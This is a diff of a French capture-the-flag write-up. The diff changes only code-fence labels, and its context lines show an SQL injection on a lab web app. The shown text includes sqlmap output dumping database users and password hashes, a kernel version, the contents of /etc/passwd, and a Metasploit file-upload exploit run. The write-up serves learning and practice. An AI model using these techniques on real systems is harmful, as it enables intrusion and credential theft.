@@ -21,7 +21,7 @@ Captain Obvious
 
 Il y a peu de surprise sur quel service va se faire exploiter :  
 
-```plain
+```
 Nmap scan report for 10.10.10.100
 Host is up (0.00016s latency).
 Not shown: 65533 closed ports
@@ -61,26 +61,26 @@ A l'ouest rien de nouveau
 
 Quand on reproduit l'attaque SQl le script PHP nous renvoie des erreurs super-parlantes avec la requête SQL au complet :  
 
-```plain
+```
 SELECT * FROM users WHERE email='"'' AND pass='4a8a9fc31dc15a4b87bb145b05db3ae0bf2333e4' AND active IS NULL
 ```
 
 On lance *SQLmap* qui voit la faille mais bloque quand on lui demande des actions particulières (comme *--current-user*) :  
 
-```plain
+```
 [21:48:19] [WARNING] the back-end DBMS is not MySQL
 [21:48:19] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system.
 ```
 
 Etant donné que j'ai spécifié *--dbms=mysql* c'est visiblement un bug dans *sqlmap*. Une mise à jour plus tard ça fonctionne :  
 
-```plain
+```
 current user:    'root@localhost'
 ```
 
 Avec l'option *--schema* on obtient les différentes bases de données et la structure des tables :  
 
-```plain
+```
 Database: ch16
 Table: users
 [8 columns]
@@ -100,7 +100,7 @@ Table: users
 
 Les hashs des utilisateurs MySQL (tables users via l'utilisation de *--passwords*) :  
 
-```plain
+```
 [21:59:14] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
 [21:59:14] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
 [21:59:14] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
@@ -111,7 +111,7 @@ Malheureusement aucun des hashs n'est tombé même avec une bonne wordlist. Il f
 
 On dumpe le contenu de la table *users* de la base *ch16* utilisé par l'application web (*-D ch16 -t users --dump*) :  
 
-```plain
+```
 +---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
 | user_id | pass                                     | email            | active | last_name | first_name | user_level | registration_date   |
 +---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
@@ -127,13 +127,13 @@ Par conséquent il doit être possible de jouer directement avec *INTO OUTFILE* 
 
 On est sur un kernel Linux 2.6 64bits :  
 
-```plain
+```
 Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
 Contenu de /etc/passwd :  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -234,7 +234,7 @@ Alternative mega-happy ending
 
 L'exploit ne fonctionne qu'à moitié dans notre cas puisqu'il parvient à changer le fichier *password.txt* et uploader un script PHP mais le payload ne semble pas aller plus loin (pas de session créée) :  
 
-```plain
+```
 msf exploit(sphpblog_file_upload) > exploit
 
 [*] Started bind handler
